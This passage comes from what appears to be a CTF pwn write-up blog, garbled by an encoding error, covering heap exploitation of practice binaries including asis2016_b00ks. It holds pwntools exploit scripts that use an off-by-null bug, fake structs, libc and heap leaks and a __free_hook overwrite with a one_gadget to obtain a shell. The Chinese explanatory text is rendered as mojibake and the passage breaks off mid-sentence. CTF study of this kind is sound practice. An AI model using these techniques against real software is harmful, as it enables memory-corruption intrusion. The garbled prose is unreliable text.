class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#spy chunk</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#merge chunk</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    new((<span class="number">0x47</span>-i),<span class="string">&#x27;f&#x27;</span>*(<span class="number">0x47</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x550</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#touch off merge</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">free_hook_addr=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(free_hook_addr))</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007204507054.png" alt="image-20221007204507054"></p><h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h2><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>é€šè¿‡å­¦ä¹ è¿™é“é¢˜çš„æ€»ç»“ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€è¿™é“é¢˜å­˜åœ¨off_by_nullæ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è®©ç»“æ„ä½“å †å—è½åœ¨æˆ‘ä»¬å¯æ§çš„åŒºåŸŸå†…ï¼Œä»è€Œå¯ä»¥å¯¹ç»“æ„ä½“å †å—ä¸­å­˜æ”¾çš„chunkåœ°å€è¿›è¡Œä¿®æ”¹ã€‚</p><p>2ã€åˆ©ç”¨mmapç”³è¯·è¶…å¤§å†…å­˜ï¼Œç„¶åé…åˆoff_by_nullä¿®æ”¹ç»“æ„ä½“å †å—ä¸­çš„chunkåœ°å€ï¼Œæ‰§è¡Œshowå‡½æ•°è¿›è¡Œæ³„éœ²libcåŸºåœ°å€ï¼ŒåŒç†ç”¨editå‡½æ•°æ¥åŠ«æŒ__free_hookï¼Œå†™å…¥one_gadgetã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007204614828.png" alt="image-20221007204614828"></p><h3 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="/../img/image-20221007204636156.png" alt="image-20221007204636156"></p><p>åœ¨è¿™ä¸ªå‡½æ•°é‡Œï¼ˆå·²è¢«é‡å‘½åï¼‰å­˜åœ¨off_by_nullæ¼æ´ï¼Œæˆ‘ä»¬è¾“å…¥æœ€å¤§å­—èŠ‚çš„æ•°æ®æ—¶ï¼Œä¼šå¤šå‡ºæ¥ä¸€ä¸ª0é€ æˆäº†æº¢å‡ºã€‚åˆ†æä¸€ä¸‹å‡ ä¸ªå…³é”®çš„ç‚¹ï¼Œç„¶ååˆ¤æ–­ä¸€ä¸‹è¿™é‡Œèƒ½å¦è¢«åˆ©ç”¨ã€‚</p><p>é¦–å…ˆæ˜¯ç¨‹åºé‡Œå­˜åœ¨ä¸€ä¸ªç»“æ„ä½“ï¼Œå¦‚ä¸‹ã€‚è¯¥ç»“æ„ä½“å¤§å°ä¸º0x20å­—èŠ‚ï¼Œä»¥æœ€å¤§çš„æˆå‘˜å­—èŠ‚æ•°ä½œä¸ºç»“æ„ä½“æ¯ä¸ªå˜é‡ç±»å‹çš„åŸºæœ¬é•¿åº¦ï¼Œæœ€å¤§ä¸º8å­—èŠ‚ï¼Œå› æ­¤å››ä¸ªå˜é‡å…¨éƒ¨å…«å­—èŠ‚å¯¹é½ï¼Œç»“æ„ä½“ä¸º0x20å­—èŠ‚ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">void</span> *book_name;</span><br><span class="line">    <span class="type">void</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“è®°å½•äº†ä¸¤ä¸ªchunkçš„ä½ç½®ï¼ˆä¹Ÿå°±æ˜¯ä¸¤ä¸ªvoidæŒ‡é’ˆï¼‰ï¼Œå’Œç»“æ„ä½“çš„idä»¥åŠdescription_chunkçš„å¤§å°ã€‚ç„¶åç»“æ„ä½“çš„åœ°å€å­˜å‚¨åˆ°äº†bssæ®µï¼Œè€Œç»“æ„ä½“æ˜¯å•ç‹¬å­˜æ”¾åœ¨äº†ä¸€ä¸ªchunkã€‚<strong>ï¼ˆæ„å‘³ç€ä¸€æ¬¡createå°±ä¼šäº§ç”Ÿä¸‰ä¸ªchunkï¼Œåˆ†åˆ«æ˜¯å­˜æ”¾book_nameçš„chunkå’Œdescriptionçš„chunkå’Œç»“æ„ä½“chunkï¼‰</strong></p><p>ç»“æ„ä½“çš„åœ°å€å­˜å‚¨åœ¨ä¸‹å›¾çš„ä½ç½®ã€‚</p><p><img src="/../img/image-20221007204647488.png" alt="image-20221007204647488"></p><p>åŒæ—¶è¿™é“é¢˜æœ‰ä¸ªæ¯”è¾ƒé‡è¦çš„å˜é‡å°±æ˜¯author nameã€‚å› ä¸ºå®ƒå­˜åœ¨off_by_nullæ¼æ´ï¼Œä¸‹å›¾æ˜¯author_nameçš„ä½ç½®ã€‚<img src="/../img/9F5lswCuGDYvaMR-1665146431267-47.png" alt="image-20220603174907077"></p><p>è·ç¦»å­˜åœ¨ç»“æ„ä½“çš„åœ°å€ä»…ä»…åªæœ‰0x20ä¸ªå­—èŠ‚ã€‚è€Œæˆ‘ä»¬å¯ä»¥å¾€author_nameé‡Œé¢å†™å…¥0x20å­—èŠ‚çš„æ•°æ®ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬æ˜¯å¯ä»¥æº¢å‡ºåˆ°ç»“æ„ä½“åœ°å€ä¸€ä¸ª00å­—èŠ‚ã€‚å…·ä½“æƒ…å†µå…ˆå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12AF</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å°±æ˜¯æ­¤æ—¶åˆ©ç”¨off_by_nullæ¼æ´å‰çš„æƒ…å†µï¼Œæ­¤æ—¶ç»“æ„ä½“åœ°å€é‡Œæ˜¯æ­£å¸¸å­˜æ”¾çš„å››ä¸ªæˆå‘˜å˜é‡ã€‚</p><p><img src="/../img/image-20221007204711563.png" alt="image-20221007204711563"></p><p>å¯ä»¥çœ‹è§ä¸‹å›¾ï¼Œå­˜æ”¾çš„ç»“æ„ä½“åœ°å€çš„æœ€ä½å­—èŠ‚å·²ç»è¢«ä¿®æ”¹æˆäº†00ã€‚</p><p><img src="/../img/image-20221007204719564.png" alt="image-20221007204719564"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><h4 id="å¹³å¸¸ä½¿ç”¨showæˆ–è€…editã€freeå‡½æ•°æ˜¯æ€ä¹ˆæ‰¾åˆ°å¯¹åº”çš„chunkçš„ï¼Ÿ"><a href="#å¹³å¸¸ä½¿ç”¨showæˆ–è€…editã€freeå‡½æ•°æ˜¯æ€ä¹ˆæ‰¾åˆ°å¯¹åº”çš„chunkçš„ï¼Ÿ" class="headerlink" title="å¹³å¸¸ä½¿ç”¨showæˆ–è€…editã€freeå‡½æ•°æ˜¯æ€ä¹ˆæ‰¾åˆ°å¯¹åº”çš„chunkçš„ï¼Ÿ"></a>å¹³å¸¸ä½¿ç”¨showæˆ–è€…editã€freeå‡½æ•°æ˜¯æ€ä¹ˆæ‰¾åˆ°å¯¹åº”çš„chunkçš„ï¼Ÿ</h4><p><strong>å…ˆå»bssæ®µæ‰¾å­˜æ”¾çš„å¯¹åº”ç»“æ„ä½“åœ°å€ï¼Œç„¶åå»çœ‹ç»“æ„ä½“é‡Œé¢è®°å½•çš„chunkä¿¡æ¯ï¼Œå†é€šè¿‡chunkä¿¡æ¯ï¼ˆä¹Ÿå°±æ˜¯chunkçš„åœ°å€ï¼‰æ¥æ‰¾åˆ°å¯¹åº”çš„chunk</strong>ã€‚<u>ç°åœ¨æˆ‘ä»¬å·²ç»æŠŠç»“æ„ä½“åœ°å€ç»™æ”¹äº†ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå¾€è¿™ä¸ªç»“æ„ä½“åœ°å€é‡Œé¢å†™å…¥æ•°æ®ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯ä»¥å»éæ³•è¿›è¡Œeditã€showã€freeäº†ï¼ˆå› ä¸ºå¯ä»¥å»æ“ä½œåŸæœ¬ä¸å­˜åœ¨çš„chunkï¼‰</u>ã€‚æ¥ä¸‹æ¥çš„æ ¸å¿ƒå°±æ˜¯æˆ‘ä»¬è¦ç¡®å®šæ˜¯å¦èƒ½å¤Ÿå¾€è¿™ä¸ªç»“æ„ä½“é‡Œå†™å…¥æ•°æ®ã€‚</p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾è¿™ä¸ªåœ°å€æ˜¯0x000055937ccbe000ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å½“å‰ä¸¤ä¸ªchunkçš„åœ°å€ã€‚</p><p><img src="/../img/image-20221007204732988.png" alt="image-20221007204732988"></p><p>æ ¹æ®ä¸Šå›¾å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ç°åœ¨å¹¶ä¸èƒ½æ§åˆ¶0x000055937ccbe000è¿™ä¸ªåœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå †å—ï¼ˆæˆ‘ä»¬ç”³è¯·çš„chunkï¼‰çš„å¤§å°ï¼Œ<strong>æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸‹å‰ä¸¤ä¸ªå †å—çš„å¤§å°ï¼Œè®©0x000055937ccbe000è¿™ä¸ªåœ°å€è½åœ¨descriptionçš„è¿™ä¸ªchunkå³å¯ï¼ˆå› ä¸ºæˆ‘ä»¬editå¯ä»¥ç¼–è¾‘descriptionè¿™ä¸ªchunkï¼‰</strong> ç¨å¾®ç®—ä¸€ä¸‹ï¼Œåªéœ€è¦è®©ç¬¬ä¸€ä¸ªchunkå¤§å°ä¸º0xd0ï¼ˆè°ƒè¯•æˆ–è€…è‡ªå·±ç”¨è®¡ç®—å™¨å‡ï¼Œéƒ½èƒ½ç®—å‡ºæ¥ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®©0x000055937ccbe100(è¿™é‡Œå˜æˆ0x000055937ccbe100çš„åŸå› æ˜¯å‰ä¸¤ä¸ªå †å—å¤ªçš„æŠ¬é«˜ï¼Œè®©ç¬¬äºŒå­—èŠ‚çš„ååŠä¸ªå­—èŠ‚è¿›ä½äº†ï¼Œä½†å¹¶ä¸å½±å“ï¼Œå› ä¸ºè¦†ç›–çš„ä»…ä»…æ˜¯æœ€åä¸€ä¸ªå­—èŠ‚æˆ00ï¼‰è¿™ä¸ªåœ°å€è½åœ¨descriptionè¿™ä¸ªchunkçš„èŒƒå›´é‡Œï¼Œè¿™æ­¥çš„ç›®çš„æ˜¯ä¸ºäº†æ¥ä¸‹æ¥ç¼–è¾‘ç»“æ„ä½“å†…å®¹æ‰“ä¸‹é“ºå«ã€‚ï¼ˆå¯ä»¥å‘ç°ä¸‹å›¾çš„description_chunkæ˜¯ä»å·²ç»è¦†ç›–åˆ°äº†0x000055937ccbe100)</p><p><img src="/../img/image-20221007204742463.png" alt="image-20221007204742463"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åªéœ€ç”¨editç¼–è¾‘è¿™ä¸ªchunkï¼Œç„¶åæ„é€ ä¸€ä¸ªstruct_chunkå³å¯ã€‚</p><p>å°†å…¶ä¸­çš„description_chunkçš„åœ°å€æ”¹æˆfreeçš„gotè¡¨ï¼Œç„¶åç”¨showæ³„éœ²å®ƒçš„çœŸå®åœ°å€ï¼Œå†ç”¨editå»ä¿®æ”¹å®ƒçš„çœŸå®åœ°å€ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆä½¿ç”¨ä¸‹é¢çš„è„šæœ¬è¯•è¯•è¿™ä»¶äº‹æƒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12af</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(free_got_addr)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸‹å›¾å‘ç°ï¼Œä¼ªé€ å¥½free_gotçš„åœ°å€æ”¾åˆ°description_chunkçš„ä½ç½®ï¼Œæ˜¯å¼€äº†pieã€‚å› æ­¤æ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œé‡‡ç”¨äº†å¦ä¸€ç§æ–¹æ³•æ¥æ³„éœ²libcåŸºåœ°å€ã€‚</p><p><img src="/../img/image-20221007204752038.png" alt="image-20221007204752038"></p><h4 id="é€šè¿‡mmapæ˜ å°„è¶…å¤§åŒºåŸŸï¼Œæ¥æ³„éœ²libcåŸºåœ°å€"><a href="#é€šè¿‡mmapæ˜ å°„è¶…å¤§åŒºåŸŸï¼Œæ¥æ³„éœ²libcåŸºåœ°å€" class="headerlink" title="é€šè¿‡mmapæ˜ å°„è¶…å¤§åŒºåŸŸï¼Œæ¥æ³„éœ²libcåŸºåœ°å€"></a>é€šè¿‡mmapæ˜ å°„è¶…å¤§åŒºåŸŸï¼Œæ¥æ³„éœ²libcåŸºåœ°å€</h4><p>åœ¨è¿™ä¹‹å‰ï¼Œéœ€è¦å…ˆçœ‹ä¸€ä¸‹è¿›ç¨‹çš„ç©ºé—´å¸ƒå±€ã€‚ä¸‹å›¾è½¬è‡ª<a href="https://blog.csdn.net/cztqwan/article/details/80248479">(30æ¡æ¶ˆæ¯) è¿›ç¨‹çš„å†…å­˜ç©ºé—´å¸ƒå±€_cztqwançš„åšå®¢-CSDNåšå®¢_è¿›ç¨‹å†…å­˜å¸ƒå±€</a></p><p><img src="/../img/image-20221007204803175.png" alt="image-20221007204803175"></p><p>æ¯ä¸ªè“è‰²ç©ºé—´ä»£è¡¨çš„åŒºåŸŸï¼Œæ˜¯å¦å½¼æ­¤å­˜åœ¨éšæœºçš„åç§»ï¼Œç”¨äº†random offsetæ¥æ ‡æ³¨ã€‚å¯ä»¥çœ‹åˆ°<strong>å†…æ ¸ç©ºé—´ï¼Œæ ˆï¼Œå†…å­˜æ˜ å°„æ®µç­‰ç­‰éƒ½å­˜åœ¨ç€éšæœºåç§»ï¼Œå› æ­¤æˆ‘ä»¬è·å–äº†æ ˆåœ°å€ä¹Ÿæ— æ³•åˆ©ç”¨åç§»æ¥ç®—å‡ºå †çš„åœ°å€</strong>ï¼Œå…¶ä½™ä¹Ÿæ˜¯åŒç†ã€‚ä½†æ˜¯<strong>å†…å­˜æ˜ å°„æ®µéƒ½æ˜¯mmapæ˜ å°„çš„åŒºåŸŸï¼ŒåŒ…æ‹¬äº†åŠ¨æ€é“¾æ¥åº“ï¼ˆè¿™é‡Œæˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼Œå¦‚æœä¸å¯¹çš„è¯ï¼Œè¿˜è¯·æŒ‡æ­£ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å†ç”¨mmapæ˜ å°„ä¸€å—åŒºåŸŸï¼Œä¾æ—§æ˜¯å’ŒåŠ¨æ€é“¾æ¥åº“åŒå±äºä¸€å¤§å—åŒºåŸŸã€‚å› æ­¤æ–°æ˜ å°„çš„è¿™å—åŒºåŸŸå’ŒlibcåŸºåœ°å€å­˜åœ¨å›ºå®šåç§»</strong>ã€‚æ€ä¹ˆè§¦å‘mmapæ˜ å°„ä¸€å—åŒºåŸŸå‘¢ï¼Ÿåˆ©ç”¨mallocç”³è¯·ä¸€å—è¶…å¤§å†…å­˜æ¥å®ç°ï¼ŒåŒæ—¶è¿™ä¸ªåœ°å€ä¹Ÿä¼šè¢«è®°å½•åœ¨ç»“æ„ä½“å †å—ä¸­ã€‚</p><p>å› æ­¤æˆ‘ä»¬å°†ç»“æ„ä½“å †å—ä¸­çš„description_chunk_addræ”¹æˆ<strong>æŒ‡å‘mmapç”³è¯·çš„é‚£ä¸ªåœ°å€</strong>å³å¯(è¿™ä¸ªåœ°å€è‚¯å®šæ˜¯ä½äºå †ä¸Šçš„ï¼Œå› æ­¤æˆ‘ä»¬ç°åœ¨éœ€è¦è·å–ä¸€ä¸ªå †çš„åœ°å€)</p><p>è€ƒè™‘åˆ°author nameå’Œç»“æ„ä½“å †å—çš„åœ°å€ç´§æŒ¨ç€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†author nameç»™å¡«æ»¡ï¼Œç„¶åæ‰“å°author nameï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªå †åœ°å€ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><p><img src="/../img/LE5DOxmh7TVAZRU-1665146431267-54.png" alt="image-20220603202640806"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å…ˆç”³è¯·ä¸€å—è¶…å¤§å†…å­˜ï¼Œç„¶ååˆ©ç”¨åç§»å°†ç»“æ„ä½“å †å—(è¿™ä¸ªç»“æ„ä½“å †å—æ˜¯å¯æ§çš„é‚£ä¸ªå †å—ï¼‰ä¸­çš„description_addræ”¹æˆæŒ‡å‘ç»“æ„ä½“å †å—ï¼ˆè¿™ä¸ªç»“æ„ä½“å †å—æ˜¯å­˜æ”¾mmapæ˜ å°„åœ°å€çš„é‚£ä¸ªå †å—ï¼‰ä¸­å­˜æ”¾description_addrçš„åœ°å€ã€‚</p><p><img src="/../img/image-20221007204827458.png" alt="image-20221007204827458"></p><p>ç„¶åå»æ³„éœ²è¿™ä¸ªlibcåœ°å€ï¼Œè„šæœ¬å¦‚ä¸‹ã€‚</p><figure class="highlight 